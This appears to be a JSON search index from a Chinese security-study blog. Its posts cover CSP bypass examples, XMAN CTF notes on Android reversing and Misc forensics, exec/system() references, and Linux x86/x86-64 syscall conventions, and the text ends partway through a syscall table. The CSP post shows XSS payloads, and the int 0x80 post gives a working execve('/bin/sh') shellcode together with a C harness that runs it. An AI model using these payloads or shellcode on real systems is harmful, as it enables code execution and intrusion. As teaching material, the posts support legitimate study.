&apos;sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng=&apos;&gt;&gt; 下面的代码就会允许执行，因为hash值相符。 123&gt; &lt;script&gt;alert(&apos;Hello, world.&apos;);&lt;/script&gt;&gt;&gt; 注意，计算hash值的时候，\\&lt;script>标签不算在内。 除了script-src选项，nonce值和hash值还可以用在style-src选项，控制页面内嵌的样式表。 六、注意点（1）script-src和object-src是必设的，除非设置了default-src。 因为攻击者只要能注入脚本，其他限制都可以规避。而object-src必设是因为 Flash 里面可以执行外部脚本。 （2）script-src不能使用unsafe-inline关键字（除非伴随一个nonce值），也不能允许设置data:URL。 下面是两个恶意攻击的例子。 1234&gt; &lt;img src=&quot;x&quot; onerror=&quot;evil()&quot;&gt;&gt; &lt;script src=&quot;data:text/javascript,evil()&quot;&gt;&lt;/script&gt;&gt;&gt; （3）必须特别注意 JSONP 的回调函数。 12345&gt; &lt;script&gt; src=&quot;/path/jsonp?callback=alert(document.domain)//&quot;&gt;&gt; &lt;/script&gt;&gt;&gt; 上面的代码中，虽然加载的脚本来自当前域名，但是通过改写回调函数，攻击者依然可以执行恶意代码。 七、参考链接 CSP Is Dead, Long Live CSP! , by Lukas Weichselbaum An Introduction to Content Security Policy, by Mike West","tags":[{"name":"csp","slug":"csp","permalink":"http://yoursite.com/tags/csp/"}]},{"title":"XMAN之旅——Android","date":"2017-08-11T00:47:57.000Z","path":"2017/08/11/XMAN之旅——Android/","text":"1. 赵帅讲android基础1.1 APK的文件结构重要的标签及属性 Minsdklevel Targetsdklevel android:enable android:export Android:process Browerable jar包和apk包 1.2 常见的基本类型反编译采用的是dalvik字节码，反编译之后成为smali文件。 dalvik字节码有两种类型，原始类型和引用类型。对象和数组是引用类型，其它都是原始类型。 smali数据类型都是用一个字母表示，如果你熟悉Java的数据类型，你会发现表示smali数据类型的字母其实是Java基本数据类型首字母的大写，除boolean类型外，在smail中用大写的”Z”表示boolean类型。 标识 类型 V void，只能用于返回值类型 Z boolean B byte S short C char I int J long (64 bits) F float D double (64 bits) L 对象类型 [ 数据类型 对象以Lpackage/name/ObjectName;的形式表示。前面的L表示这是一个对象类型，package/name/是该对象所在的包，ObjectName是对象的名字，“;”表示对象名称的结束。相当于java中的package.name.ObjectName。 类的表示形式 Ljava/lang/String;相当于java.lang.String 数组的表示形式 [ 表示一个整型一维数组，相当于java中的int[]对于多维数组，只要增加[就行了。[[I相当于int[][]，[[[I相当于int[][][]。注意每一维的最多255个。 对象数组的表示 [Ljava/lang/String;表示一个String对象数组。 方法表示形式 方法通常必须详细的指定方法类型: 方法名，参数类型，返回类型，所有这些信息都是为虚拟机是能够找到正确的方法并执行。 Lpackage/name/ObjectName;-&gt;MethodName(III)Z 在上面的例子中，Lpackage/name/ObjectName;表示类，MethodName是方法名。III为参数（在此是3个整型参数），Z是返回类型（bool型）。方法的参数是一个接一个的，中间没有隔开。 一个更复杂的例子：method(I[[IILjava/lang/String;[Ljava/lang/Object;)Ljava/lang/String; 在java中则为：String method(int, int[][], int, String, Object[]) 1.3 Dalvik Code掌握以上的字段和方法的描述,只能说我们懂了如何描述一个字段和方法,而关于方法中具体的逻辑则需要了解Dalvik中的指令集.因为Dalvik是基于寄存器的架构的,因此指令集和JVM中的指令集区别较大,反而更类似x86的中的汇编指令. Davilk指令集大全 1.3 ELF可以链接第三方库，可以解决历史代码问题，可以进行逻辑保护，一般用so文件表示。 1.4 常见组件组件一：Intent Action Component Category data Android中提供了Intent机制来协助应用间的交互与通讯，或者采用更准确的说法是，Intent不仅可用于应用程序之间，也可用于应用程序内部的activity, service和broadcast receiver之间的交互。Intent这个英语单词的本意是“目的、意向、意图”。 Intent是一种运行时绑定（runtime binding)机制，它能在程序运行的过程中连接两个不同的组件。通过Intent，你的程序可以向Android表达某种请求或者意愿，Android会根据意愿的内容选择适当的组件来响应。 组件二：Service onStart onStartCommand Exported Android:process 组件三：Activity 组件四：Webview setSavePassword setJavascriptEnabled addJavascriptInterface Loadurl 组件五：PendingIntent Notification getActivity getService getBroadcast 1.5 运行时的目录结构私有目录 /data/data/packagename sdcard 1.6 工具反编译工具 Dex2jar jd-gui ——jar包反编译 jadx ——Apk反编译 jeb ——Apk解包、反汇编、反编译 其他工具 Burpsuite Akana Janus 1.7 ctf中常用的方法HOOK 代码分析 目标方法筛选 编写脚本 运行测试 重打包 解包 apktool d 修改 打包 apktool b 签名 1.8 工业界漏洞组件暴露相关信息 Enabled =&gt; true exported =&gt; false (有intent-filter，默认值就是true) 关键 Action =&gt; 系统Action 非系统Action Permission 关键 ContentProvider 攻击窗口 动态注册 窗口期 组件劫持 Activity劫持 Receiver劫持 Service劫持 intent嗅探 Webview组件问题 远程代码执行","tags":[]},{"title":"XMAN之旅——Misc","date":"2017-08-10T16:49:22.000Z","path":"2017/08/11/XMAN之旅——Misc/","text":"1. Misc概述MISC，即Miscellaneous，即安全杂项，题目或涉及流量分析、电子取证、人肉搜索、数据分析等等。 MISC，中文即杂项，包括隐写，数据还原，脑洞、社会工程、与信息安全相关的大数据等。 竞赛过程中解MISC时会涉及到各种脑洞，各种花式技巧，主要考察选手的快速理解、学习能力以及日常知识积累的广度、深度。 MISC这一块并不像PWN\\REVERSE等需要深厚的理论基础，所以我们直接从经典题目开始入手。 2. Misc题目类型Misc大体上分为Encode编码转换、Steg隐写分析、Forensic数字取证以及其他类型 3. 编码转换由于编码很多种，可以在网上找各种站长工具对编码进行转换，而且效率很高！ 常见的编码有：base64、base32、base16、ascii、unicode、url、摩斯编码、曼切斯特编码等 4. 取证和隐写分析4.1 常见的工具文本编辑工具： 010Editor UtralEdit Winhex 隐写工具： StegSolver Stegdetect wbSteg4 MP3Stego outguess stepic steghide 其他工具： 7zcracker archpr tweakpng audacity binwalk foremost Ffmpeg Alternatestreamview Dsfok-tools Snow 4.2 常见的隐写术从最早的图种(copy /b test.jpg+test.torrent test.jpg),CTF比赛中最开始的图片隐写(JPG，PNG，GIF)Word，PDF等隐写音频，视频中的隐写(波形，频谱…….)Exe中的病毒行为分析Pcap流量包磁盘文件(IMG,VMDK)交换数据流(NTFS数据流)HTML文件 5. 自己的思考想要深入学习Misc，首先需要熟练掌握一些文件格式，并能够根据相应的格式合理运用工具，如此才能掌握Misc！","tags":[]},{"title":"SROP攻击","date":"2017-08-07T02:57:29.000Z","path":"2017/08/07/SROP攻击/","text":"","tags":[]},{"title":"linux下system()/execve()/execl()函数使用详解","date":"2017-08-07T02:08:23.000Z","path":"2017/08/07/linux下system-execve-execl-函数使用详解/","text":"本节详细可参考http://www.cnblogs.com/akira90/archive/2012/12/05/2802809.html 1. execve函数12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455 相关函数： fork，execl，execle，execlp，execv，execvp 表头文件： #include unistd.h 定义函数： int execve(const char * filename,char * const argv[ ],char * const envp[ ]); 函数说明： execve()用来执行参数filename字符串所代表的文件路径，第二个参数系利用数组指针来传递给执行文件，最后一个参数则为传递给执行文件的新环境变量数组。 返回值： 如果执行成功则函数不会返回，执行失败则直接返回-1，失败原因存于errno 中。 错误代码: EACCES1. 欲执行的文件不具有用户可执行的权限。2. 欲执行的文件所属的文件系统是以noexec 方式挂上。3. 欲执行的文件或script翻译器非一般文件。 EPERM1.进程处于被追踪模式，执行者并不具有root权限，欲执行的文件具有SUID 或SGID 位。2.欲执行的文件所属的文件系统是以nosuid方式挂上，欲执行的文件具有SUID 或SGID 位元，但执行者并不具有root权限。E2BIG 参数数组过大 ENOEXEC 无法判断欲执行文件的执行文件格式，有可能是格式错误或无法在此平台执行。 EFAULT 参数filename所指的字符串地址超出可存取空间范围。 ENAMETOOLONG 参数filename所指的字符串太长。 ENOENT 参数filename字符串所指定的文件不存在。 ENOMEM 核心内存不足 ENOTDIR 参数filename字符串所包含的目录路径并非有效目录 EACCES 参数filename字符串所包含的目录路径无法存取，权限不足 ELOOP 过多的符号连接 ETXTBUSY 欲执行的文件已被其他进程打开而且正把数据写入该文件中 EIO I/O 存取错误 ENFILE 已达到系统所允许的打开文件总数。 EMFILE 已达到系统所允许单一进程所能打开的文件总数。 EINVAL 欲执行文件的ELF执行格式不只一个PT_INTERP节区 EISDIR ELF翻译器为一目录 ELIBBAD ELF翻译器有问题。 2. system()函数1234567891011121314151617相关函数： fork，execve，waitpid，popen表头文件： #include stdlib.h定义函数： int system(const char * string);函数说明： system()会调用fork()产生子进程，由子进程来调用/bin/sh c string来执行参数string字符串所代表的命令，此命&gt;令执行完后随即返回原调用的进程。在调用system()期间SIGCHLD 信号会被暂时搁置，SIGINT和SIGQUIT 信号则会被忽略。返回值： =-1:出现错误 =0:调用成功但是没有出现子进程 &gt;0:成功退出的子进程的id如果system()在调用/bin/sh时失败则返回127，其他失败原因返回-1。若参数string为空指针(NULL)，则返回非零值&gt;。 如果system()调用成功则最后会返回执行shell命令后的返回值，但是此返回值也有可能为 system()调用/bin/sh失败所返回的127，因此最好能再检查errno 来确认执行成功。附加说明： 在编写具有SUID/SGID权限的程序时请勿使用system()，system()会继承环境变量，通过环境变量可能会造成系统安全的问题。 3. execl()函数int execl(const char * filename,char * const argv[ ],char * const envp[ ]);","tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"int 80h系统调用方法","date":"2017-08-07T01:17:48.000Z","path":"2017/08/07/int-80h系统调用方法/","text":"1. int 0x80简介先看看下面通过系统调用实现的hello world代码：1234567891011121314151617.section .datamsg: .ascii &quot;Hello world!\\n&quot;.section .text.globl _start_start: movl $4, %eax movl $1, %ebx movl $msg, %ecx movl $13, %edx int $0x80 movl $1, %eax movl $0, %ebx int $0x80 系统调用是通过int 0x80来实现的，eax寄存器中为调用的功能号，ebx、ecx、edx、esi等等寄存器则依次为参数，从 /usr/include/asm/unistd.h中可以看到exit的功能号_NR_exit为1，write(_NR_write)功能号为4，因此第一个int $0x80调用之前eax寄存器值为4，ebx为文件描述符，stdout的文件描述符为1，ecx则为buffer的内存地址，edx为buffer长度。第二个int $0x80之前eax为1表示调用exit，ebx为0表示返回0。 2. 系统调用功能号这部分可以参考System Call Number Definition以及http://asm.sourceforge.net/syscall.html#2 其实调用功能号放在了/usr/include/asm/unistd.h之中，打开文件发现： cat /usr/include/asm/unistd.h | less 12345678910111213141516#define __NR_exit 1#define __NR_fork 2#define __NR_read 3#define __NR_write 4#define __NR_open 5#define __NR_close 6#define __NR_waitpid 7#define __NR_creat 8#define __NR_link 9#define __NR_unlink 10#define __NR_execve 11#define __NR_chdir 12#define __NR_time 13#define __NR_mknod 14#define __NR_chmod 15#define __NR_lchown 16 总共有383条，就不细细讲述了 3. 系统调用及参数传递过程这部分具体可以参考：系统调用及参数传递过程深入理解Linux的系统调用 我们以x86为例说明：由于陷入指令是一条特殊指令，而且依赖与操作系统实现的平台，如在x86中，这条指令是int 0x80，这显然不是用户在编程时应该使用的语句，因为这将使得用户程序难于移植。所以在操作系统的上层需要实现一个对应的系统调用库，每个系统调用都在该库中包含了一个入口点（如我们看到的fork, open, close等等），这些函数对程序员是可见的，而这些库函数的工作是以对应系统调用号作为参数，执行陷入指令int 0x80，以陷入核心执行真正的系统调用处理函数。当一个进程调用一个特定的系统调用库的入口点，正如同它调用任何函数一样，对于库函数也要创建一个栈帧。而当进程执行陷入指令时，它将处理机状态转换到核心态，并且在核心栈执行核心代码。 这里给出一个示例（linux/include/asm/unistd.h）：12345678910#define _syscallN(type, name, type1, arg1, type2, arg2, . . . ) \\type name(type1 arg1,type2 arg2) \\&#123; \\long __res; \\__asm__ volatile (\"int $0x80\" \\: \"=a\" (__res) \\: \"0\" (__NR_##name),\"b\" ((long)(arg1)),\"c\" ((long)(arg2))); \\. . . . . .__syscall_return(type,__res); \\&#125; 在执行一个系统调用库中定义的系统调用入口函数时，实际执行的是类似如上的一段代码。这里牵涉到一些gcc的嵌入式汇编语言，不做详细的介绍，只简单说明其意义：其中\\_\\NR\\##name是系统调用号，如name == ioctl，则为\\_\\_NR\\_ioctl，它将被放在寄存器eax中作为参数传递给中断0x80的处理函数。而系统调用的其它参数arg1, arg2, …则依次被放入ebx, ecx, . . .等通用寄存器中，并作为系统调用处理函数的参数，这些参数是怎样传入核心的将会在后面介绍。 注意该调用是从左至右依次传参，与普通函数的由右往左依次传参不同 4. 实例介绍4.1 sys_execve（x86）从系统调用约定 一文中我们可以找到sys_execve系统调用的内容 eax ebx ecx edx esi edi 11 sys_execve 0x0b char __user * char user *user * char user *user * struct pt_regs * - arch/alpha/kernel/entry.S:925 从此处可以知道sys_execve的系统调用约定 从Linux中pt_regs结构体 可以得到pt_regs的结构介绍 在http://man7.org/linux/man-pages/man2/execve.2.html 中有给出execve的定义 12#include &lt;unistd.h&gt;int execve(const char *filename, char *const argv[], char *const envp[]); ebx是执行文件路径，ecx是命令行参数，edx是环境变量 很多时候ecx=0，edx=0。但是有时候若有参数，可以设置ecx 范例shellcode: 123456789101112131415161718192021222324xor %eax,%eaxpush %eaxpush $0x68732f2fpush $0x6e69622fmov %esp,%ebxpush %eaxpush %ebxmov %esp,%ecxmov $0xb,%alint $0x80********************************#include &lt;stdio.h&gt;#include &lt;string.h&gt; char *shellcode = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\" \"\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";int main(void)&#123;fprintf(stdout,\"Length: %d\\n\",strlen(shellcode));(*(void(*)()) shellcode)();return 0;&#125;","tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"系统调用约定","date":"2017-08-05T17:56:30.000Z","path":"2017/08/06/系统调用约定/","text":"1、windows 64位调用约定windows64 位的调用很是奇怪，因为它不是通过栈来传参，而是通过寄存器来传参！ 最为常见的是，当参数只有一个的时候，一般是选用rcx来传递参数！ 2、Linux 64位调用约定其实32位系统调用，我们在int-80h系统调用方法已经有过讲述。现在，我们将要讨论的是64位的系统调用。不过在此之前，我们需要知道linux的两个有关系统调用的重要文件unistd\\_32.h和unistd\\_64.h，这两个文件定义了系统调用号！ 2.1 每种调用号需要传递哪些参数在linux系统中某个程序执行时进行的系统调用可以通过strace命令来查看，solaris中对应的命令为dtrace，而mac os x中可以通过类似的dtruss命令来查看。当进程已经处于 D 状态（uninterruptible sleep）时，strace 也帮不上忙。这时候可以通过: cat /proc//syscall 来查看。（详细内容可以到http://www.jb51.net/article/50923.htm查看) 32位的系统调用表的参数可以到 http://syscalls.kernelgrok.com/ 查找；关于32位系统中使用汇编语言调用syscall table，将在另一篇博文[linux下32位汇编的系统调用]中详述。 而在64位系统中，大神说了：可以通过grep在源代码中查找： To find the implementation of a system call, grep the kernel tree for SYSCALL_DEFINE.\\?(syscall, For example, to find the read system call: 12345illusion:/usr/src/linux-source-3.19$ grep -rA3 &apos;SYSCALL_DEFINE.\\?(read,&apos; *fs/read_write.c:SYSCALL_DEFINE3(read, unsigned int, fd, char __user *, buf, size_t, count)fs/read_write.c-&#123;fs/read_write.c- struct file *file;fs/read_write.c- ssize_t ret = -EBADF; 也可以在以下网址中查找：http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ 2.2 调用如何传递参数以及结果如何返回在64位linux中，一般来说系统调用的参数统统放在寄存器中，最多可以用到6个寄存器；如果多余6个参数的系统调用怎么传递参数？这个还不清楚，有的文档说64位系统调用的参数最多不会超过6个；还有的文档说超过6个参数的话，其余参数全部通过堆栈来传递。超过6个参数的系统调用，本猫没有实际碰到，也不知到底该怎么办！?就这个问题，有兴趣的童鞋可以和本猫单独切磋讨论。 具体调用规则如下： 用户模式的系统调用依次传递的寄存器为: rdi，rsi，rdx，rcx，r8和r9 内核接口的系统调用一次传递的寄存器为: rdi，rsi，rdx，r10，r8和r9 注意这里和用户模式的系统调用只有第4个寄存器不同，其他都相同。 系统调用通过syscall指令进入，不像32位下的汇编使用的是int 0x80指令； 系统调用号放在rax寄存器里； 系统调用限制最多6个参数，没有参数直接通过栈传递，原话是: System-calls are limited to six arguments, no argument is passed directly on the stack 系统调用的返回结果，也就是syscall指令的返回放在rax寄存器中； 只有整形值和内存型的值可以传递给内核，这个也不十分明白，原话是: Only values of class INTEGER or class MEMORY are passed to the kernel 有的童鞋可能要问了，要是浮点数怎么传递给接口！？有参数是浮点数的系统调用吗？这个还真不清楚，不过参数是浮点数的C标准库函数的调用那是大大的有，这个等到在另一篇博文[64汇编调用C标准库函数]中再详细给大家解答。 3、Linux系统调用实例代码的功能很简单，显示一行文本，然后退出。我们使用了syscall中的write和exit调用，查一下前面的调用号和参数，我们初步总结如下： write(即sys_write)调用号为1，需传递3个参数 123unsigned int fdconst char *bufsize_t count exit(sys_exit)调用号为60，只需传递一个错误码 1int error_code 如果该值为0表示程序执行成功。 因为以上两个调用最多的也只有3个参数，所以我们依次只会用到3个寄存器rdi,rsi和rdx。 实际代码如下： 12345678910111213141516171819section .text;if use ldglobal _start;if use gcc;global main_start:;main mov rax,1 ;write NO mov rdi,1 ;fd mov rsi,msg ;addr of msg string mov rdx,msg_len ;lenght of msg string syscall mov rax,60 ;exit NO mov rdi,0 ;error_code syscall msg: db &quot;Hello World!&quot;,0xa msg_len:equ $-msg 编译连接命令如下： 12nasm -f elf64 p.sld -o p p.o 如果是mac os x系统下命令如下： 12nasm -f macho64 p.sld -o p p.o 如果你要生成32位的代码，在编译时把elf64改为elf32就可以了，不过我前面说过：32位和64位汇编结构变化较大，光改这个是没办法运行成功的。 不出所料代码运行输出一行:Hello World！并且程序返回后用echo $?看，应该为0. 这个例子很简单，下面看一下稍微复杂点的调用:mmap,该调用共有6个参数，我们再一次总结如下：mmap(sys_mmap) 系统调用号为9，参数分别为： 123456unsigned long addrunsigned long lenunsigned long protunsigned long flagsunsigned long fdunsigned long offset 第一个参数是需要映射到的地址，我们这里传0，表示不关心映射到哪；第二个参数是映射空间的大小；第三个参数表示映射区域的保护方式，有很多种，我们这里只让它可读可写即可，所以只用到2者的组合： PROT_WRITE|PROT_READ 第四个参数是映射区域的一些特性，有很多组合。这里只用MAP_SHARED|MAP_ANONYMOUS,后者表示建立匿名映射，会忽略参数fd，所以不设及文件。 第五个参数就是fd，前面说了可以忽略，所以我们传递-1；最后一个参数是映射的偏移量，我们也传递0. 该调用如果成功返回映射区域内存的起始地址，否则返回MAP_FAILED（-1）,错误原因存于errno中，我们可以用strerror(errno)查看具体含义。不过该函数是C库中的，这里我们捎带的用一下。 提到mmap我们不得不提到munmap，用猜大家也知道该调用的含义吧： munmap(sys_munmap) 调用号为11,需传递2个参数: 12unsigned long startsize_t len 4、附录4.1 32系统调用表 # Name Registers Definition eax ebx ecx edx esi edi 0 sys_restart_syscall 0x00 - - - - - kernel/signal.c:2058 1 sys_exit 0x01 int error_code - - - - kernel/exit.c:1046 2 sys_fork 0x02 struct pt_regs * - - - - arch/alpha/kernel/entry.S:716 3 sys_read 0x03 unsigned int fd char __user *buf size_t count - - fs/read_write.c:391 4 sys_write 0x04 unsigned int fd const char __user *buf size_t count - - fs/read_write.c:408 5 sys_open 0x05 const char __user *filename int flags int mode - - fs/open.c:900 6 sys_close 0x06 unsigned int fd - - - - fs/open.c:969 7 sys_waitpid 0x07 pid_t pid int __user *stat_addr int options - - kernel/exit.c:1771 8 sys_creat 0x08 const char __user *pathname int mode - - - fs/open.c:933 9 sys_link 0x09 const char __user *oldname const char __user *newname - - - fs/namei.c:2520 10 sys_unlink 0x0a const char __user *pathname - - - - fs/namei.c:2352 11 sys_execve 0x0b char __user * char user *user * char user *user * struct pt_regs * - arch/alpha/kernel/entry.S:925 12 sys_chdir 0x0c const char __user *filename - - - - fs/open.c:361 13 sys_time 0x0d time_t __user *tloc - - - - kernel/posix-timers.c:855 14 sys_mknod 0x0e const char __user *filename int mode unsigned dev - - fs/namei.c:2067 15 sys_chmod 0x0f const char __user *filename mode_t mode - - - fs/open.c:507 16 sys_lchown16 0x10 const char __user *filename old_uid_t user old_gid_t group - - kernel/uid16.c:27 17 not implemented 0x11 - - - - - 18 sys_stat 0x12 char __user *filename struct old_kernel_stat user *statbuf - - - fs/stat.c:150 19 sys_lseek 0x13 unsigned int fd off_t offset unsigned int origin - - fs/read_write.c:167 20 sys_getpid 0x14 - - - - - kernel/timer.c:1337 21 sys_mount 0x15 char __user *dev_name char __user *dir_name char __user *type unsigned long flags void __user *data fs/namespace.c:2118 22 sys_oldumount 0x16 char __user *name - - - - fs/namespace.c:1171 23 sys_setuid16 0x17 old_uid_t uid - - - - kernel/uid16.c:67 24 sys_getuid16 0x18 - - - - - kernel/uid16.c:212 25 sys_stime 0x19 time_t __user *tptr - - - - kernel/time.c:81 26 sys_ptrace 0x1a long request long pid long addr long data - kernel/ptrace.c:688 27 sys_alarm 0x1b unsigned int seconds - - - - kernel/timer.c:1314 28 sys_fstat 0x1c unsigned int fd struct old_kernel_stat user *statbuf - - - fs/stat.c:174 29 sys_pause 0x1d - - - - - kernel/signal.c:2700 30 sys_utime 0x1e char __user *filename struct utimbuf __user *times - - - fs/utimes.c:27 31 not implemented 0x1f - - - - - 32 not implemented 0x20 - - - - - 33 sys_access 0x21 const char __user *filename int mode - - - fs/open.c:356 34 sys_nice 0x22 int increment - - - - kernel/sched.c:4282 35 not implemented 0x23 - - - - - 36 sys_sync 0x24 - - - - - fs/sync.c:98 37 sys_kill 0x25 int pid int sig - - - kernel/signal.c:2317 38 sys_rename 0x26 const char __user *oldname const char __user *newname - - - fs/namei.c:2765 39 sys_mkdir 0x27 const char __user *pathname int mode - - - fs/namei.c:2130 40 sys_rmdir 0x28 const char __user *pathname - - - - fs/namei.c:2244 41 sys_dup 0x29 unsigned int fildes - - - - fs/fcntl.c:131 42 sys_pipe 0x2a int __user *fildes - - - - fs/pipe.c:1117 43 sys_times 0x2b struct tms __user *tbuf - - - - kernel/sys.c:896 44 not implemented 0x2c - - - - - 45 sys_brk 0x2d unsigned long brk - - - - mm/mmap.c:245 46 sys_setgid16 0x2e old_gid_t gid - - - - kernel/uid16.c:51 47 sys_getgid16 0x2f - - - - - kernel/uid16.c:222 48 sys_signal 0x30 int sig __sighandler_t handler - - - kernel/signal.c:2683 49 sys_geteuid16 0x31 - - - - - kernel/uid16.c:217 50 sys_getegid16 0x32 - - - - - kernel/uid16.c:227 51 sys_acct 0x33 const char __user *name - - - - kernel/acct.c:274 52 sys_umount 0x34 char __user *name int flags - - - fs/namespace.c:1132 53 not implemented 0x35 - - - - - 54 sys_ioctl 0x36 unsigned int fd unsigned int cmd unsigned long arg - - fs/ioctl.c:613 55 sys_fcntl 0x37 unsigned int fd unsigned int cmd unsigned long arg - - fs/fcntl.c:429 56 not implemented 0x38 - - - - - 57 sys_setpgid 0x39 pid_t pid pid_t pgid - - - kernel/sys.c:921 58 not implemented 0x3a - - - - - 59 sys_olduname 0x3b struct oldold_utsname __user * - - - - kernel/sys.c:1132 60 sys_umask 0x3c int mask - - - - kernel/sys.c:1460 61 sys_chroot 0x3d const char __user *filename - - - - fs/open.c:408 62 sys_ustat 0x3e unsigned dev struct ustat __user *ubuf - - - fs/statfs.c:175 63 sys_dup2 0x3f unsigned int oldfd unsigned int newfd - - - fs/fcntl.c:116 64 sys_getppid 0x40 - - - - - kernel/timer.c:1348 65 sys_getpgrp 0x41 - - - - - kernel/sys.c:1020 66 sys_setsid 0x42 - - - - - kernel/sys.c:1055 67 sys_sigaction 0x43 int sig const struct old_sigaction __user *act struct old_sigaction __user *oact - - arch/mips/kernel/signal.c:300 68 sys_sgetmask 0x44 - - - - - kernel/signal.c:2657 69 sys_ssetmask 0x45 int newmask - - - - kernel/signal.c:2663 70 sys_setreuid16 0x46 old_uid_t ruid old_uid_t euid - - - kernel/uid16.c:59 71 sys_setregid16 0x47 old_gid_t rgid old_gid_t egid - - - kernel/uid16.c:43 72 sys_sigsuspend 0x48 int history0 int history1 old_sigset_t mask - - arch/s390/kernel/signal.c:58 73 sys_sigpending 0x49 old_sigset_t __user *set - - - - kernel/signal.c:2562 74 sys_sethostname 0x4a char __user *name int len - - - kernel/sys.c:1165 75 sys_setrlimit 0x4b unsigned int resource struct rlimit __user *rlim - - - kernel/sys.c:1275 76 sys_old_getrlimit 0x4c unsigned int resource struct rlimit __user *rlim - - - kernel/sys.c:1256 77 sys_getrusage 0x4d int who struct rusage __user *ru - - - kernel/sys.c:1452 78 sys_gettimeofday 0x4e struct timeval __user *tv struct timezone __user *tz - - - kernel/time.c:101 79 sys_settimeofday 0x4f struct timeval __user *tv struct timezone __user *tz - - - kernel/time.c:185 80 sys_getgroups16 0x50 int gidsetsize old_gid_t __user *grouplist - - - kernel/uid16.c:164 81 sys_setgroups16 0x51 int gidsetsize old_gid_t __user *grouplist - - - kernel/uid16.c:187 82 sys_old_select 0x52 struct sel_arg_struct __user *arg - - - - fs/select.c:701 83 sys_symlink 0x53 const char __user *old const char __user *new - - - fs/namei.c:2419 84 sys_lstat 0x54 char __user *filename struct old_kernel_stat user *statbuf - - - fs/stat.c:162 85 sys_readlink 0x55 const char __user *path char __user *buf int bufsiz - - fs/stat.c:311 86 sys_uselib 0x56 const char __user *library - - - - fs/exec.c:107 87 sys_swapon 0x57 const char __user *specialfile int swap_flags - - - mm/swapfile.c:1793 88 sys_reboot 0x58 int magic1 int magic2 unsigned int cmd void __user *arg - kernel/sys.c:368 89 sys_old_readdir 0x59 unsigned int struct old_linux_dirent __user * unsigned int - - fs/readdir.c:105 90 sys_old_mmap 0x5a struct mmap_arg_struct __user *arg - - - - mm/mmap.c:1141 91 sys_munmap 0x5b unsigned long addr size_t len - - - mm/mmap.c:2109 92 sys_truncate 0x5c const char __user *path long length - - - fs/open.c:127 93 sys_ftruncate 0x5d unsigned int fd unsigned long length - - - fs/open.c:178 94 sys_fchmod 0x5e unsigned int fd mode_t mode - - - fs/open.c:436 95 sys_fchown16 0x5f unsigned int fd old_uid_t user old_gid_t group - - kernel/uid16.c:35 96 sys_getpriority 0x60 int which int who - - - kernel/sys.c:216 97 sys_setpriority 0x61 int which int who int niceval - - kernel/sys.c:149 98 not implemented 0x62 - - - - - 99 sys_statfs 0x63 const char __user * path struct statfs __user *buf - - - fs/statfs.c:102 100 sys_fstatfs 0x64 unsigned int fd struct statfs __user *buf - - - fs/statfs.c:136 101 sys_ioperm 0x65 unsigned long unsigned long int - - not found: 102 sys_socketcall 0x66 int call unsigned long __user *args - - - net/socket.c:2210 103 sys_syslog 0x67 int type char __user *buf int len - - kernel/printk.c:412 104 sys_setitimer 0x68 int which struct itimerval __user *value struct itimerval __user *ovalue - - kernel/itimer.c:279 105 sys_getitimer 0x69 int which struct itimerval __user *value - - - kernel/itimer.c:103 106 sys_newstat 0x6a char __user *filename struct stat __user *statbuf - - - fs/stat.c:237 107 sys_newlstat 0x6b char __user *filename struct stat __user *statbuf - - - fs/stat.c:247 108 sys_newfstat 0x6c unsigned int fd struct stat __user *statbuf - - - fs/stat.c:273 109 sys_uname 0x6d struct old_utsname __user * - - - - kernel/sys.c:1115 110 sys_iopl 0x6e unsigned int struct pt_regs * - - - not found: 111 sys_vhangup 0x6f - - - - - fs/open.c:1008 112 not implemented 0x70 - - - - - 113 sys_vm86old 0x71 struct vm86_struct __user * struct pt_regs * - - - not found: 114 sys_wait4 0x72 pid_t pid int __user *stat_addr int options struct rusage __user *ru - kernel/exit.c:1726 115 sys_swapoff 0x73 const char __user *specialfile - - - - mm/swapfile.c:1533 116 sys_sysinfo 0x74 struct sysinfo __user *info - - - - kernel/timer.c:1565 117 sys_ipc 0x75 - - - - - ipc/syscall.c:16 118 sys_fsync 0x76 unsigned int fd - - - - fs/sync.c:221 119 sys_sigreturn 0x77 struct pt_regs *regs - - - - arch/alpha/kernel/entry.S:758 120 sys_clone 0x78 unsigned long unsigned long unsigned long unsigned long struct pt_regs * arch/alpha/kernel/entry.S:733 121 sys_setdomainname 0x79 char __user *name int len - - - kernel/sys.c:1214 122 sys_newuname 0x7a struct new_utsname __user *name - - - - kernel/sys.c:1097 123 sys_modify_ldt 0x7b int void __user * unsigned long - - not found: 124 sys_adjtimex 0x7c struct timex __user *txc_p - - - - kernel/time.c:206 125 sys_mprotect 0x7d unsigned long start size_t len unsigned long prot - - mm/mprotect.c:221 126 sys_sigprocmask 0x7e int how old_sigset_t __user *set old_sigset_t __user *oset - - kernel/signal.c:2573 127 not implemented 0x7f - - - - - 128 sys_init_module 0x80 void __user *umod unsigned long len const char __user *uargs - - kernel/module.c:2611 129 sys_delete_module 0x81 const char __user *name_user unsigned int flags - - - kernel/module.c:720 130 not implemented 0x82 - - - - - 131 sys_quotactl 0x83 unsigned int cmd const char __user *special qid_t id void __user *addr - fs/quota/quota.c:333 132 sys_getpgid 0x84 pid_t pid - - - - kernel/sys.c:990 133 sys_fchdir 0x85 unsigned int fd - - - - fs/open.c:382 134 sys_bdflush 0x86 int func long data - - - fs/buffer.c:3278 135 sys_sysfs 0x87 int option unsigned long arg1 unsigned long arg2 - - fs/filesystems.c:182 136 sys_personality 0x88 unsigned int personality - - - - kernel/exec_domain.c:191 137 not implemented 0x89 - - - - - 138 sys_setfsuid16 0x8a old_uid_t uid - - - - kernel/uid16.c:118 139 sys_setfsgid16 0x8b old_gid_t gid - - - - kernel/uid16.c:126 140 sys_llseek 0x8c unsigned int fd unsigned long offset_high unsigned long offset_low loff_t __user *result unsigned int origin fs/read_write.c:191 141 sys_getdents 0x8d unsigned int fd struct linux_dirent __user *dirent unsigned int count - - fs/readdir.c:191 142 sys_select 0x8e int n fd_set __user *inp fd_set __user *outp fd_set __user *exp struct timeval __user *tvp fs/select.c:596 143 sys_flock 0x8f unsigned int fd unsigned int cmd - - - fs/locks.c:1569 144 sys_msync 0x90 unsigned long start size_t len int 